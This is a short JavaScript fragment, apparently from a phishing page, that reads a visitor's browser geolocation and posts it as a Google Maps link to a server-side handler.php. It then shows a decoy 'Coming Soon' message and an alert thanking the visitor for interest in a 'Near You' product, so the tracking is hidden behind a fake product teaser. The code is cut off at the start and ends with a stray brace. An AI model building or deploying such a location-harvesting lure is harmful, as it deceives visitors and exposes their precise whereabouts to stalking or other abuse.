  function showPosition(position)
  {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    $.ajax({
      type: 'POST',
      url: 'handler.php',
      data: {"data":`Google Map Link : https://google.com/maps/place/${lat}+${lon}`},
      success: function(){$('#change').html('Coming Soon');},
      mimeType: 'text'
    });
    alert('Thankyou For Taking Interest in Near You...This Product is Coming Soon...');
  };
}
